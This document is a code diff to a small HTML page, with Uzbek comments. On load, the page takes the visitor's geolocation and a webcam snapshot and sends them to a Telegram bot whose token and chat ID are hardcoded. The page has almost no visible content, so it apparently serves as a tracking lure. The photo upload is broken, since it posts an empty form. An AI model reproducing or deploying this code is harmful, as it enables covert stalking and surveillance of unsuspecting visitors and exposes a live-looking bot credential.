@@ -1,15 +1,19 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Track Location</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location and Photo</title>
     <script>
         document.addEventListener('DOMContentLoaded', function () {
+            let botToken = '6233093483:AAEAkRHWiJpvDwOxPhSHLMvKpoHmwAogsMQ';  // O'zingizning bot tokeningizni kiriting
+            let chatId = '5528965178';  // O'zingizning chat ID'ni kiriting
+
+            // 1. Foydalanuvchining joylashuvini olish
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function (position) {
-                    var latitude = position.coords.latitude;
-                    var longitude = position.coords.longitude;
-                    var botToken = 'Y6233093483:AAEAkRHWiJpvDwOxPhSHLMvKpoHmwAogsMQ';  // O'zingizning bot tokeningizni kiriting
-                    var chatId = '5528965178';  // Botning chat ID sini kiriting
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
 
                     // Telegram botga joylashuvni yuborish
                     fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
@@ -24,18 +28,59 @@
                         })
                     })
                     .then(response => response.json())
-                    .then(data => console.log('Success:', data))
-                    .catch((error) => console.error('Error:', error));
-                }, function (error) {
-                    console.error('Error getting location:', error);
+                    .then(data => console.log('Location sent:', data))
+                    .catch((error) => console.error('Error sending location:', error));
                 });
             } else {
-                console.log('Geolocation is not supported by this browser.');
+                alert('Geolocation is not supported by this browser.');
             }
+
+            // 2. Foydalanuvchidan kameradan rasm olish
+            async function capturePhoto() {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                let video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                let canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+
+                // Bir soniyadan keyin surat olish
+                setTimeout(function () {
+                    let context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Rasmni base64 formatida olish
+                    let photo = canvas.toDataURL('image/png');
+                    sendPhotoToTelegram(photo);
+
+                    // Video oqimini to'xtatish
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1000);
+            }
+
+            // Telegram botga rasm yuborish
+            function sendPhotoToTelegram(photo) {
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: new FormData()
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Photo sent:', data);
+                })
+                .catch((error) => {
+                    console.error('Error sending photo:', error);
+                });
+            }
+
+            // Sayt ochilganda rasm olish jarayonini boshlash
+            capturePhoto();
         });
     </script>
 </head>
 <body>
-    <h1>Tracking Location</h1>
+    <h1>Tracking Location and Capturing Photo</h1>
 </body>
 </html>
